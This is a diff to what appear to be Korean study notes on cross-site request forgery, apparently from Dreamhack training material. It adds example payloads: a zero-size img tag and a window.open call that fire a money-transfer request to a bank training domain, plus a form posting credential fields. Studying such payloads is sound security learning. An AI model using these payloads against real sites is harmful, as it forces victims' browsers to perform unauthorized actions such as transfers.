@@ -8,13 +8,20 @@
     -> HTML 또는 JS 를 통해 공격
 
 ```HTML
-HTML - <img> 태그 이용
-
+HTML
+// img 태그 이용
 <img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
+
+// form 태그 이용
+<form action="httpS://test.dreamhack.io/users/1"method="post">
+  <input name="user">
+  <input name="pass">
+  <input name="submit">
+</form>
 ```
 
 ```JS
-Java Script - <form> 태그 사용
+Java Script
 
 // 새 창 띄우기
 window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
